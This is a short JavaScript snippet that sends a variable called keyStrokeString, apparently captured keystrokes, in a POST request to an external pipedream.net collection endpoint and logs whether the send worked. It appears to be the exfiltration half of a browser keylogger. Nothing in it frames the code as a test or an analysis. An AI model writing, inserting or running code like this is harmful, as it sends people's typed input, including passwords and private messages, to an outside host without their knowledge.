const str = keyStrokeString;

fetch('https://eofyfyh52mz68hy.m.pipedream.net', {
    method: 'POST',
    body: JSON.stringify({ message: str }),
    headers: {
        'Content-Type': 'application/json'
    }
}).then(response => {
    if (response.ok) {
        console.log('String sent successfully:', str);
    } else {
        console.error('Failed to send string:', response.status);
    }
}).catch(error => {
    console.error('Error sending string:', error);
});
